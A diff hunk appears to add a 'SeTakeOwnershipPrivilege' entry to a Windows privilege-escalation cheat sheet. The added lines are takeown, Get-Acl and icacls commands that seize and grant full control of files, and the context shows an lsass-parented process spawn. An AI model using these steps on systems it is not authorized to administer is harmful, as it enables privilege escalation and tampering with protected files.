@@ -2490,6 +2490,17 @@ PS C:\> .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent((Get-Process "lsass
 https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC
 ```
 
+- SeTakeOwnershipPrivilege
+
+```
+C:\> dir /q <file>
+C:\> takeown /f <file>
+PS C:\> Get-ChildItem -Path '<file>' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+PS C:\> Get-ChildItem -Path '<file>' | select name,directory, @{Name=“Owner”;Expression={(Get-ACL $_.Fullname).Owner}}
+C:\> icacls "<file"
+C:\> icacls "<file>" /grant <username>:F
+```
+
 #6. - Persistence
 -----------------------------------------
 
